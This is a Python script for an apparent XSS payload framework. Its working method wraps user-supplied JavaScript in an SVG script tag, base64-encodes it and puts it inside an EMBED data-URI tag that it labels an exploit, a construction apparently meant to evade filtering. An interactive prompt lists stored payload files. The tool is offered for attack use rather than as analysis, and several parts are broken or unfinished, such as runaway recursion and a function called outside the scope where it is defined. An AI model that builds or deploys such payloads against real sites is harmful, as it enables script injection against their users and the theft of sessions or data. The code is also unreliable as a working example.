#!/usr/bin/python3
import base64, os
from os import listdir, path
from sys import argv
try:
    input = raw_input
except:
    pass
def selectmethod():
    print(r'''
 __   __ _____ _____    __                                             _    
 \ \ / // ____/ ____|  / _|                                           | |   
  \ V /| (___| (___   | |_ _ __ __ _ _ __ ___   _____      _____  _ __| | __
   > <  \___ \\___ \  |  _| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
  / . \ ____) |___) | | | | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 /_/ \_\_____/_____/  |_| |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\
''')
    print('''
    --- METHODS & XSS command prompt ---
    0: XSS command prompt.
    1: Uses a SVG tag with a SCRIPT tag inside encoded in base64 inside a EMBED tag
    2: Empty spot
    3: Empty spot




    ''')
    methodnr = input("Select a method: ")
    if(int(methodnr) == 1):
        payloadjs = str(input("Paste your JAVASCRIPT here: \n"))
        #string2encode = '''<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">'''+payloadjs+'''</script></svg>'''
        #base64encoded = base64.b64encode(string2encode)
        import os
        script_dir = os.path.dirname(__file__)
        rel_path = "Methods\\EMBEDtag.method"
        method_path = os.path.join(script_dir, rel_path)
        method = open(method_path, "rb").read()
        #print(str(method).replace("101payloadjs101", payloadjs))
        encodethis = str(method).replace("101payloadjs101", payloadjs)
        encodethis = encodethis.replace("b'","").replace("'","")
        print(encodethis)
        base64encoded = base64.b64encode(encodethis.encode("utf-8"))
        output = '''<EMBED SRC="data:image/svg+xml;base64,'''+str(base64encoded)+'''" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'''
        print('''
    --- Payload/Exploit XSS code (Encoded): 

    ''')
        print(output.replace("b'","").replace("'",""))

    if(int(methodnr) == 0):
        def helpfunc():
            print('''
--- Commands ---
    payloads: Lists payloads
    menu: Return to menu
    help: Shows this screen
    info <payload name>: Prints <payloadname>.js.info file in command prompt.
    update <payloads|methods|all>: Updates available payloads or methods
''')
        helpfunc()
        while True:
            def xssprompt():
                option = input("XSS:>") + " str"
                command = option.split(" ")
                if (command[0] == "help"):
                    helpfunc()
                if (command[0] == "payloads"):
                    try:
                        for file in listdir("Payloads"):
                            if file.endswith(".js"):
                                print(path.join("\Payloads", file))
                    except Exception as err:
                        print(err)
                if (command[0] == "info"):
                    try:
                        print("Info about payload: "+command[1])
                    except:
                        print("No filename given.")
					#open("Payloads/"+command[1], "r")
                if (command[0] == "menu"):
                    selectmethod()
                if (command[0] == "update"):
                    try:
                        print("Updating: "+command[1])
                    except:
                        print("No parameter given.")
                else:
                    xssprompt()
                xssprompt()
            xssprompt()
        xssprompt()

enters = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
if (argv[1] == "shell"):
    xssprompt()
while(True):
    try:
        selectmethod()
    except:
        print(enters)
#https://stackoverflow.com/questions/3964681/find-all-files-in-a-directory-with-extension-txt-in-python
